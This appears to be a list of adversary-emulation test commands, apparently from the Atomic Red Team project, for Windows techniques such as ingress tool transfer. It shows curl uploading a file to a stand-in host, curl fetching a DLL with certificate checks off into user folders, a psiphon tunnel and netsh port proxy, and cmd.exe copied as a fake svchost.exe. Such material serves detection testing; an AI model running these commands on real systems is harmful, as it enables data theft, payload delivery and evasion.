C:\Windows\System32\Curl.exe -T c:\temp\atomictestfile.txt www.example.com 
&& C:\Windows\System32\Curl.exe --upload-file c:\temp\atomictestfile.txt www.example.com 
&& C:\Windows\System32\Curl.exe -d c:\temp\atomictestfile.txt www.example.com 
&& C:\Windows\System32\Curl.exe --data c:\temp\atomictestfile.txt www.example.com

C:\Windows\System32\Curl.exe -k https://github.com/redcanaryco/atomic-red-team/raw/058b5c2423c4a6e9e226f4e5ffa1a6fd9bb1a90e/atomics/T1218.010/bin/AllTheThingsx64.dll -o c:\users\public\music\allthethingsx64.dll && C:\Windows\System32\Curl.exe -k https://github.com/redcanaryco/atomic-red-team/raw/058b5c2423c4a6e9e226f4e5ffa1a6fd9bb1a90e/atomics/T1218.010/bin/AllTheThingsx64.dll --output c:\users\public\music\allthethingsx64.dll && C:\Windows\System32\Curl.exe -k https://github.com/redcanaryco/atomic-red-team/raw/058b5c2423c4a6e9e226f4e5ffa1a6fd9bb1a90e/atomics/T1218.010/bin/AllTheThingsx64.dll -o c:\programdata\allthethingsx64.dll && C:\Windows\System32\Curl.exe -k https://github.com/redcanaryco/atomic-red-team/raw/058b5c2423c4a6e9e226f4e5ffa1a6fd9bb1a90e/atomics/T1218.010/bin/AllTheThingsx64.dll -o %Temp%\allthethingsx64.dll

start %USERPROFILE%\Downloads\psiphon3.exe
timeout /t 20 >nul 2>&1
Taskkill /IM msedge.exe /F >nul 2>&1
Taskkill /IM psiphon3.exe /F >nul 2>&1
Taskkill /IM psiphon-tunnel-core.exe /F >nul 2>&1
netsh interface portproxy add v4tov4 listenport=1337 connectport=1337 connectaddress=127.0.0.1

copy C:\Windows\System32\cmd.exe C:\svchost.exe 
&& C:\svchost.exe /c echo T1105 > \\localhost\c$\T1105.txt

copy-item C:\Windows\System32\cmd.exe C:\svchost.exe
